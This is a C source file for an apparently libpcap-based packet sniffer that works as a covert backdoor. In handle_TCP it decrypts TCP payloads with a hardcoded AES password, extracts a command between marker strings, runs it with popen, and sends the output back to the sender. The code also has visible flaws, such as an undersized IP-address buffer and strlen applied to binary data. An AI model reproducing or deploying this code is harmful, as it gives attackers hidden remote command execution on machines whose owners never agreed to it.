#include "pkt_sniffer.h"

// Check all the headers in the Ethernet frame
void pkt_callback(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    u_int16_t type = handle_ethernet(args,pkthdr,packet);

    if(type == ETHERTYPE_IP) // handle the IP packet
    {
        handle_IP(args,pkthdr,packet);
    }
    else if (type == ETHERTYPE_ARP) // handle the ARP packet 
    {
    }
    else if (type == ETHERTYPE_REVARP) // handle reverse arp packet 
    {
    }
}


// This function will parse the IP header and print out selected fields of interest
void handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    	const struct my_ip* ip;
    	u_int length = pkthdr->len;
    	u_int hlen,off,version;
    	int len;
        char src_ip[14];
	
    	// Jump past the Ethernet header 
    	ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    	length -= sizeof(struct ether_header); 

    	// make sure that the packet is of a valid length 
    	if (length < sizeof(struct my_ip))
    	{
        	//printf ("Truncated IP %d",length);
        	exit (1);
    	}

    	len     = ntohs(ip->ip_len);
    	hlen    = IP_HL(ip); 	// get header length 
    	version = IP_V(ip);	// get the IP version number

    	// verify version 
    	if(version != 4)
    	{
      		//fprintf(stdout,"Unknown version %d\n",version);
      		exit (1); 
        }

    	// verify the header length */
    	if(hlen < 5 )
    	{
        	//fprintf(stdout,"Bad header length %d \n",hlen);
    	}

    	// Ensure that we have as much of the packet as we should 
    	if (length < len)
        	//printf("\nTruncated IP - %d bytes missing\n",len - length);

    	// Ensure that the first fragment is present
    	off = ntohs(ip->ip_off);
    	if ((off & 0x1fff) == 0 ) 	// i.e, no 1's in first 13 bits 
        {   // print SOURCE DESTINATION hlen version len offset */
//         	fprintf(stdout,"IP: ");
//         	fprintf(stdout,"%s ", inet_ntoa(ip->ip_src));
//         	fprintf(stdout,"%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen,version,len,off);
    	}
    	
    	switch (ip->ip_p) 
        {
            case IPPROTO_TCP:
                //printf("   Protocol: TCP\n");
                memset(src_ip, 0x0, sizeof(src_ip));
                strncpy(src_ip, inet_ntoa(ip->ip_src), sizeof(src_ip));
                handle_TCP (args, pkthdr, packet, src_ip);
                break;
            case IPPROTO_UDP:
                //printf("   Protocol: UDP\n");
                break;
            case IPPROTO_ICMP:
                //printf("   Protocol: ICMP\n");
                break;
            case IPPROTO_IP:
                //printf("   Protocol: IP\n");
                break;
            default:
                //printf("   Protocol: unknown\n");
                break;
        }
}

// This function will parse the IP header and print out selected fields of interest
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, char * src)
{
    const struct sniff_tcp *tcp=0;          // The TCP header 
    const struct my_ip *ip;              	// The IP header 
    const char *payload;                  // Packet payload 

    int size_ip;
    int size_tcp;
    int size_payload;

    char *ptr, *ptr2, *decrypted;
    char command[MAX_SIZE], argv[MAX_SIZE];

// 	printf ("\n");
// 	printf ("TCP packet\n");

    ip = (struct my_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL (ip)*4;
    
    // define/compute tcp header offset
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    
    if (size_tcp < 20) 
    {
            printf("   * Control Packet? length: %u bytes\n", size_tcp);
            exit(1);
    }
    
    printf ("   Src port: %d\n", ntohs(tcp->th_sport));
    printf ("   Dst port: %d\n", ntohs(tcp->th_dport));
    
    // define/compute tcp payload (segment) offset
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    decrypted = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    //decrypted = (char *) malloc(strlen(payload) * sizeof(char));
    // compute tcp payload (segment) size
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
        
    // Print payload data, including binary translation 
    if (size_payload > 0)
    {
        printf("   Payload (%d bytes):\n", size_payload);
        print_payload (payload, size_payload);

        printf("Encrypted(%d): %s\n", strlen(payload), payload);
        
        // Decrypting
        EVP_CIPHER_CTX *en, *de;

        en = EVP_CIPHER_CTX_new();
        de = EVP_CIPHER_CTX_new();
        
        unsigned int salt[] = {12345, 54321};
        
        
        /* gen key and iv. init the cipher ctx object */
        if (aes_init(PASSWORD, strlen(PASSWORD), (unsigned char *)&salt, en, de)) {
            printf("Couldn't initialize AES cipher\n");
            exit(1);
        }
        
        int len = strlen(payload) + 1;
        decrypted = aes_decrypt(de, (unsigned char *)payload, &len);
        printf("Decrypted: %s\n", decrypted);

        if (!(ptr = strstr(decrypted, COMMAND_START))) 
            return;
        ptr += strlen(COMMAND_START);
        if (!(ptr2 = strstr(ptr, COMMAND_END)))
            return;
        
        memset(command, 0x0, sizeof(command));
        strncpy(command, ptr, (ptr2 - ptr));

        FILE *fp;
        char path[1035];

        fp = popen(command, "r");
        
        printf("Src: %s\n", inet_ntoa(ip->ip_src));
        if (fp == NULL) {
            printf("Failed to run command\n");
            exit(1);
        }
        
        while (fgets(path, sizeof(path), fp) != NULL) {
            //printf("%s", path);
            send_response(inet_ntoa(ip->ip_dst), src, ntohs(tcp->th_dport), ntohs(tcp->th_sport), path);
        }

        printf("%s sending ...\n", END_OF_TRANSMIT);
        // Send EOT to indicate the end of transmit
        send_response(inet_ntoa(ip->ip_dst), src, ntohs(tcp->th_dport), ntohs(tcp->th_sport), END_OF_TRANSMIT);
        
        pclose(fp);
    }
}


